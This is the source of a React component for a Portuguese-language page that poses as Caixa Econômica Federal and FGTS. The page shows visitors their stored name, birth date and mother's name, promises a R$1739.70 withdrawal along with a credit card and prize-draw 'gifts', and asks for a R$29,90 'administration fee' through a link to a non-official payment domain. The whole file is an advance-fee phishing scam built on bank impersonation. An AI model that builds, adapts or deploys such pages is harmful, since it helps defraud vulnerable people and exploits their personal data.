import { useEffect, useState } from "react";
import logo from "../assets/caixalogo.png";
import logofgts from "../assets/fgts2.png";
import caixa from "../assets/logo.png";
import pix from "../assets/pix.png";
import { IoIosWarning } from "react-icons/io";
import { Helmet } from "react-helmet";
import { UserData } from "../types/userData";
import cartao from "../assets/cartao.png"
import box from "../assets/carro.png"
// import carrinho from "../assets/carrinho.png"
import logocaixa from "../assets/caixalogo.png"
import flogo from "../assets/f-logo.png"
// import { BiDownArrowAlt } from "react-icons/bi";



export function PagamentoTarifa() {
    const [displayedAmount, setDisplayedAmount] = useState(0);
    const saqueTotal = 1739.70;

    const [, setIsVisible] = useState(false);

    useEffect(() => {
        const SECONDS_TO_DISPLAY = 44;

        let attempts = 0;
        let elsDisplayed = false;
        const alreadyDisplayedKey = `alreadyElsDisplayed${SECONDS_TO_DISPLAY}`;
        const alreadyElsDisplayed = localStorage.getItem(alreadyDisplayedKey);

        const showHiddenElements = () => {
            elsDisplayed = true;
            setIsVisible(true);
            localStorage.setItem(alreadyDisplayedKey, "true");
        };

        const startWatchVideoProgress = () => {
            if (
                typeof window.smartplayer === "undefined" ||
                !(window.smartplayer.instances && window.smartplayer.instances.length)
            ) {
                if (attempts >= 10) return;
                attempts += 1;
                setTimeout(() => startWatchVideoProgress(), 1000);
                return;
            }

            window.smartplayer.instances[0].on("timeupdate", () => {
                if (elsDisplayed || window.smartplayer.instances[0].smartAutoPlay) return;
                if (window.smartplayer.instances[0].video.currentTime < SECONDS_TO_DISPLAY) return;
                showHiddenElements();
            });
        };

        if (alreadyElsDisplayed === "true") {
            setTimeout(() => showHiddenElements(), 100);
        } else {
            startWatchVideoProgress();
        }
    }, []);

    const [userData, setUserData] = useState<UserData>({
        nome: "",
        cpf: "",
        dataNascimento: "",
        email: "",
        cep: "",
        cidade: "",
        estado: "",
        nomeMae: "",
        rua: "",
        numero: ""
    });

    // Carregar os dados do localStorage ao montar o componente
    useEffect(() => {
        const storedUserData = localStorage.getItem("userData");
        if (storedUserData) {
            setUserData(JSON.parse(storedUserData));
        }
    }, []);

    useEffect(() => {
        // Animação do valor aumentando gradualmente até o saque total
        const interval = setInterval(() => {
            setDisplayedAmount((prev) => (prev < saqueTotal ? prev + 50 : saqueTotal));
        }, 50);
        return () => clearInterval(interval);
    }, [saqueTotal]);

    return (
        <div className="min-h-screen flex flex-col items-center bg-gray-50 text-gray-900">
            <Helmet>
                <title>Pagamento com Desconto</title>
            </Helmet>

            {/* Cabeçalho com logotipo, saudação e logo FGTS */}
            <header className="flex w-full flex-col p-4 space-y-8 bg-[#025bab] ">
                <div className="flex items-center justify-between w-full">
                    <div className="flex items-center space-x-3">
                        <img width={34} src={logo} alt="Logo Caixa" />
                        <span className="text-white font-extralight">Olá, {userData?.nome.split(" ")[0]}</span>
                    </div>
                    <img src={logofgts} alt="Logo FGTS" width={65} />
                </div>
            </header>

            {/* Conteúdo principal */}
            <main className="flex flex-col items-center justify-center text-center px-4 py-6 space-y-6">
                <h1 className="text-3xl font-bold text-gray-800">VOCÊ TEM DINHEIRO<br />PARA RECEBER</h1>

                <span className="text-xl">ASSISTA O VÍDEO PARA ENTENDER</span>

                <div className="w-full  py-4">
                    <div dangerouslySetInnerHTML={{ __html: '<div id="vid_673b937b7c9d41000b963f82" style="position: relative; width: 100%; padding: 56.25% 0 0;"> <img id="thumb_673b937b7c9d41000b963f82" src="https://images.converteai.net/19e779a9-9bff-4dff-b541-9918122b88f8/players/673b937b7c9d41000b963f82/thumbnail.jpg" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; display: block;" alt="thumbnail"> <div id="backdrop_673b937b7c9d41000b963f82" style=" -webkit-backdrop-filter: blur(5px); backdrop-filter: blur(5px); position: absolute; top: 0; height: 100%; width: 100%; "></div> </div>' }} />
                    <Helmet>
                        <script type="text/javascript" id="scr_673b937b7c9d41000b963f82"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/19e779a9-9bff-4dff-b541-9918122b88f8/players/673b937b7c9d41000b963f82/player.js", s.async=!0,document.head.appendChild(s); </script>
                    </Helmet>
                </div>

                <a href="https://pay.pagamentofgt.shop/KV603k01qyEZw8y" className="w-full">
                    <button className="bg-green-500 w-full hover:bg-green-600 text-white font-bold py-3 px-6 rounded-md shadow-lg transition-all duration-200 animate-bounce mt-3">
                        PAGAR TAXA E SACAR MEU FGTS
                    </button>
                </a>

                {/* Informações sobre o saque disponível */}
                <div className="">
                    <p className="text-xl mb-2 text-gray-500 my-2">Valor disponível para saque:</p>
                    <p className="text-6xl font-semibold text-green-600">R$ {displayedAmount.toFixed(2)}</p>
                </div>

                <div className="bg-primary w-full flex p-6 pb-10 flex-col items-center space-y-6">
                    <img width={300} src={caixa} alt="" />
                    {/* 
                    <div className="flex items-center space-x-2 animate-bounce">
                        <BiDownArrowAlt className="text-white text-4xl" />
                        <div className="text-white text-3xl">Arraste para baixo</div>
                        <BiDownArrowAlt className="text-white text-4xl" />
                    </div> */}
                </div>

                <div className="space-y-4 w-full">
                    {/* Nome */}
                    <div className="flex items-center space-x-2">

                        <input
                            type="text"
                            value={userData?.nome}
                            readOnly
                            className="border-b border-b-orange-500 w-full text-lg outline-none bg-transparent"
                            placeholder="Nome"
                        />
                    </div>

                    {/* Data de Nascimento */}
                    <div className="flex items-center space-x-2">

                        <input
                            type="text"
                            value={userData?.dataNascimento}
                            readOnly
                            className="border-b border-b-orange-500 w-full text-lg outline-none bg-transparent"
                            placeholder="Data de Nascimento"
                        />
                    </div>

                    {/* Nome da Mãe */}
                    {userData?.nomeMae && (
                        <div className="flex items-center space-x-2">

                            <input
                                type="text"
                                value={userData?.nomeMae}
                                readOnly
                                className="border-b border-b-orange-500 w-full text-lg outline-none bg-transparent"
                                placeholder="Nome da Mãe"
                            />
                        </div>
                    )}
                </div>




                <div className="flex items-center space-x-2">
                    <div className="bg-orange-500 p-2 rounded-full w-fit">
                        <img width={20} src={flogo} alt="" />
                    </div>
                    <h2 className="text-3xl text-zinc-700 font-semibold">+ Brindes:</h2>
                </div>

                <div className="flex space-x-2 w-full p-2 bg-zinc-100 rounded-lg">
                    <img src={cartao} alt="cartao" width={120} />
                    <div className="flex flex-col justify-normal">
                        <h3 className="font-semibold  text-xl text-zinc-700">+ Cartão de <span className="text-yellow-600">crédito</span></h3>
                        <span>R$15.000 de limite</span>
                    </div>
                </div>

                {/* <div className="flex space-x-2 w-full p-2 bg-zinc-100 rounded-lg">
                    <img src={carrinho} alt="cartao" width={130} />
                    <div className="flex flex-col justify-normal">
                        <h3 className="font-semibold  text-xl text-zinc-700">+ Vale compra de <span className="text-yellow-600">R$400</span></h3>
                        <span>Válido em todos os mercados</span>
                    </div>
                </div> */}

                <div className="flex space-x-2 w-full p-2 bg-zinc-100 rounded-lg">
                    <img src={box} alt="cartao" width={130} />
                    <div className="flex flex-col justify-normal">
                        <h3 className="font-semibold  text-xl text-zinc-700">+ Sorteio <span className="text-yellow-600">Caixa Econômica</span></h3>
                        <span>Até R$50.000 em prêmios</span>
                    </div>
                </div>



                <h3 className="text-xl text-zinc-500">Basta pagar a taxa de administração Caixa que seu dinheiro cairá em até 3 minutos.</h3>

                <div>
                    <div className="flex items-center justify-center space-x-1">
                        <div className="bg-primary p-2 w-fit rounded-full">
                            <img src={logocaixa} width={25} alt="" />
                        </div>
                        <p className="text-lg mb-2 text-primary font-medium">Taxa de administração Caixa:</p>
                    </div>
                    {/* <p className="text-2xl mb-2 text-zinc-400">DE: R$47,89</p> */}
                    <p className="text-4xl font-semibold text-primary">R$29,90</p>
                </div>




                {/* Sessão com imagem do Pix e mensagem de justificativa */}
                <div className="flex flex-col items-center space-y-4">
                    <img src={pix} alt="Logo Pix" className="w-20 mt-4 mb-4" />
                    <p className="text-sm text-gray-600">
                        <IoIosWarning className="inline mr-1 text-yellow-500" />
                        Aproveite o desconto na taxa para receber em <strong>até 3 minutos</strong> via Pix.
                    </p>
                    <p className="text-xs text-gray-500 max-w-md">
                        Este valor já inclui o desconto da taxa para recebimento imediato via Pix,
                        proporcionando uma alternativa rápida e segura ao saque convencional.
                    </p>
                </div>



            </main>
        </div>
    );
}
